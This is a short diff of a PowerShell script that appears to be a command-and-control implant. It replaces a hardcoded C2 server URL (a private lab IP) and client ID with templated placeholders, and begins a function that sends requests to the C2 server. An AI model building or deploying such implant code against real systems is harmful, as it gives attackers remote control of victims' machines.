@@ -1,7 +1,7 @@
 # Define the URL for the command-and-control server and the client ID
-$C2_URL = 'http://10.10.14.9:8000'
-$CLIENT_ID = 'cacti'
 
+$C2_URL = 'http://{lhost}:{lport}'
+$CLIENT_ID = '{line}' 
 # Function to send a request to the C2 server
 function Send-Request {
     param (
